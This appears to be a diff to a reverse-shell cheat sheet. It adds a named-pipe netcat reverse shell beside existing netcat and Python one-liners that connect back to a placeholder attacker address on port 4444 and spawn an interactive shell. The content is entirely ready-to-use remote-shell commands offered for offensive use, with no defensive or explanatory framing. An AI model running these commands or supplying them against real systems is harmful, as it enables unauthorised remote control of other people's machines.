@@ -18,6 +18,9 @@ nc -lvp 4444
 # nc
 nc -e /bin/bash YOUR_IP 4444
 
+# nc with pipe
+mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc <YOUR_IP> 4444 1>/tmp/pipez;rm -rf /tmp/pipez 
+
 # python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
